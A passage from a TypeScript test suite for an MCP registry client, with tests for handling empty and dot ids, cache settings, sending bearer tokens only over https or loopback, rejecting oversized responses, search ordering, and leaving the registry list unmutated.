  await test("an empty id, '.' and '..' are a miss without a request", async () => {
    resetAll();
    const client = makeClient();
    const errors = collectErrors(client);
    for (const id of ["", ".", ".."]) {
      assertEqual(await client.getEntry(id), undefined, `"${id}" is a miss`);
    }
    assertEqual(mock.requests().length, 0, "no request was made");
    assertEqual(errors.length, 0, "and it is not an error");

    // Dots inside a name are fine: they stay inside one encoded segment.
    assertEqual(
      (await client.getEntry("io.example/foo"))?.id,
      "io.example/foo",
      "a dotted name still resolves",
    );
    assertEqual(mock.requests().length, 1, "positive control: one request");
  });

  await test("client enableCache: false wins over a per-registry enableCache: true", async () => {
    resetAll();
    // The default registry entry is { type: "official", enableCache: true }.
    const official: string[] = [];
    officialStub = (url) => {
      official.push(url.pathname);
      const body = url.pathname.endsWith("/servers") ? { servers: [FOO] } : FOO;
      return new Response(JSON.stringify(body), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    };

    const off = new MCPRegistryClient({
      remoteLookup: true,
      enableCache: false,
    });
    await off.getEntry("io.example/foo");
    await off.getEntry("io.example/foo");
    await off.getAllEntries();
    await off.getAllEntries();
    assertEqual(official.length, 4, "default registries: nothing is cached");

    // Positive control: the same calls with caching on make half the requests.
    official.length = 0;
    const on = new MCPRegistryClient({ remoteLookup: true });
    await on.getEntry("io.example/foo");
    await on.getEntry("io.example/foo");
    await on.getAllEntries();
    await on.getAllEntries();
    assertEqual(official.length, 2, "default registries: cached when enabled");

    // An explicit per-registry `true` cannot override the client switch.
    mock.reset();
    const explicit = makeClient({ enableCache: true }, { enableCache: false });
    await explicit.getEntry("io.example/foo");
    await explicit.getEntry("io.example/foo");
    assertEqual(mock.requests().length, 2, "explicit true does not re-enable");
  });

  await test("a bearer token is sent only over https or to loopback", async () => {
    resetAll();
    const token = "tok-transport-check";
    const seenHeaders: Record<string, string>[] = [];
    officialStub = (_url, headers) => {
      seenHeaders.push(headers);
      return new Response(JSON.stringify({ error: "not found" }), {
        status: 404,
      });
    };

    // https to a remote host: sent.
    const secure = new MCPRegistryClient({
      remoteLookup: true,
      registries: [
        { type: "custom", url: `https://${OFFICIAL_HOST}`, authToken: token },
      ],
    });
    await secure.getEntry("io.example/foo");
    assertEqual(seenHeaders.length, 1, "https registry is queried");
    assertEqual(
      seenHeaders[0].Authorization,
      `Bearer ${token}`,
      "token sent over https",
    );

    // Plain http to a remote host: the registry is skipped, nothing is sent.
    outbound.length = 0;
    const plain = new MCPRegistryClient({
      remoteLookup: true,
      registries: [
        {
          type: "custom",
          url: "http://registry.example.test",
          authToken: token,
        },
        { type: "custom", url: `http://${OFFICIAL_HOST}`, authToken: token },
      ],
    });
    const errors = collectErrors(plain);
    assertEqual(await plain.getEntry("io.example/foo"), undefined);
    assertEqual((await plain.getAllEntries()).length, WELL_KNOWN_COUNT);
    assertEqual(outbound.length, 0, "no request, so no token on the wire");
    assertEqual(errors.length, 0, "skipping is not an error");

    // Positive control: without a token the same plain-http registry is queried.
    const noToken = new MCPRegistryClient({
      remoteLookup: true,
      registries: [{ type: "custom", url: "http://registry.example.test" }],
    });
    await noToken.getEntry("io.example/foo");
    assertEqual(outbound.length, 1, "plain http without a token is attempted");

    // Loopback hosts keep working with a token over http.
    for (const host of ["localhost", "127.0.0.1", "[::1]"]) {
      outbound.length = 0;
      const loopback = new MCPRegistryClient({
        remoteLookup: true,
        registries: [
          {
            type: "custom",
            url: `http://${host}:${mock.port}`,
            authToken: token,
          },
        ],
      });
      await loopback.getEntry("io.example/foo");
      assert(
        outbound.length === 1 && outbound[0].includes(`${host}:${mock.port}`),
        `${host} is treated as loopback and queried`,
      );
    }
  });

  await test("an oversized response is rejected and degrades to local", async () => {
    resetAll();
    mock.setMode("huge");
    const client = makeClient();
    const errors = collectErrors(client);
    assertEqual(
      await assertNoThrow("getEntry (huge)", () =>
        client.getEntry("io.example/foo"),
      ),
      undefined,
    );
    assertEqual(
      (
        await assertNoThrow("getAllEntries (huge)", () =>
          client.getAllEntries(),
        )
      ).length,
      WELL_KNOWN_COUNT,
      "getAllEntries stays local",
    );
    assert(errors.length >= 2, "both failures are reported");
    assert(
      errors.every((e) => e.message.includes("exceeds")),
      "reported as a size failure",
    );
  });

  await test("search() does not reorder the list and goes through getAllEntries() without a query", async () => {
    resetAll();
    const client = makeClient();
    const before = idsOf(await client.getAllEntries());
    await client.search({ sortBy: "name", sortDirection: "desc", limit: 100 });
    assertEqual(
      idsOf(await client.getAllEntries()).join(","),
      before.join(","),
      "a search must not reorder what getAllEntries() returns next",
    );

    class Overriding extends MCPRegistryClient {
      override async getAllEntries(): Promise<McpRegistryEntry[]> {
        return [
          {
            id: "only-one",
            name: "only-one",
            description: "from the override",
            version: "1.0.0",
          },
        ];
      }
    }
    const overriding = new Overriding();
    const result = await overriding.search({});
    assertEqual(
      idsOf(result.entries).join(","),
      "only-one",
      "search() without a query uses an overridden getAllEntries()",
    );
  });

  await test("addRegistry() does not mutate the caller's registries array", async () => {
    resetAll();
    const mine: RegistryConfig[] = [{ type: "custom", url: mock.url }];
    const client = new MCPRegistryClient({
      remoteLookup: true,
      registries: mine,
    });
    client.addRegistry({ type: "custom", url: `${mock.url}/other` });
    assertEqual(mine.length, 1, "the caller's array is left alone");
    await client.getEntry("io.example/nope");
    assertEqual(mock.requests().length, 2, "both registries are queried");
  });
} finally {
  globalThis.fetch = realFetch;
  await mock.close();
}

await runSuite();
